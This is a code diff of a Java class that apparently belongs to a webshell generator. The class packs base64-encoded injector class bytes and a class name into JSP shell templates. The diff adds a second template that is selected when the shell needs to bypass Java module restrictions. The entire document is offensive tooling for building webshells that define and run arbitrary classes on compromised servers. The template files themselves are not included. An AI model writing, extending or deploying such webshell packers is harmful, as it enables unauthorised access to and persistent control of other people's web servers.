@@ -14,11 +14,13 @@ import java.util.Objects;
  */
 public class DefineClassJspPacker implements Packer {
 
-    String jspTemplate = null;
+    String template = null;
+    String bypassTemplate = null;
 
     public DefineClassJspPacker() {
         try {
-            jspTemplate = IOUtils.toString(Objects.requireNonNull(this.getClass().getResourceAsStream("/shell1.jsp")), Charset.defaultCharset());
+            template = IOUtils.toString(Objects.requireNonNull(this.getClass().getResourceAsStream("/shell1.jsp")), Charset.defaultCharset());
+            bypassTemplate = IOUtils.toString(Objects.requireNonNull(this.getClass().getResourceAsStream("/shell2.jsp")), Charset.defaultCharset());
         } catch (Exception ignored) {
 
         }
@@ -29,6 +31,11 @@ public class DefineClassJspPacker implements Packer {
     public String pack(GenerateResult generateResult) {
         String injectorBytesBase64Str = generateResult.getInjectorBytesBase64Str();
         String injectorClassName = generateResult.getInjectorClassName();
-        return jspTemplate.replace("{{className}}", injectorClassName).replace("{{base64Str}}", injectorBytesBase64Str);
+        String template = this.template;
+        if (generateResult.getShellConfig().needByPassJavaModule()) {
+            template = bypassTemplate;
+        }
+        return template.replace("{{className}}", injectorClassName)
+                .replace("{{base64Str}}", injectorBytesBase64Str);
     }
 }
